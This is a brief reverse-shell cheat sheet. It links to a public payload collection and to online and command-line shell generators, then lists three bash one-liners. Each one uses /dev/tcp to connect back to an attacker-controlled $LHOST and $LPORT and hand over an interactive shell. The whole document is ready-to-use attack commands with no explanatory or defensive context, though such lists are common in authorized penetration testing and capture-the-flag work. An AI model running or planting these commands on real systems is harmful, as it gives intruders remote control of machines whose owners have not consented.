[PayloadsAllTheThings-CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

[Payloada Online Generator](https://www.revshells.com/)

[Payloads CLI Generator](https://github.com/t0thkr1s/revshellgen)


### BASH
```
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/$LHOST/$LPORT 0<&1 2>&1
```
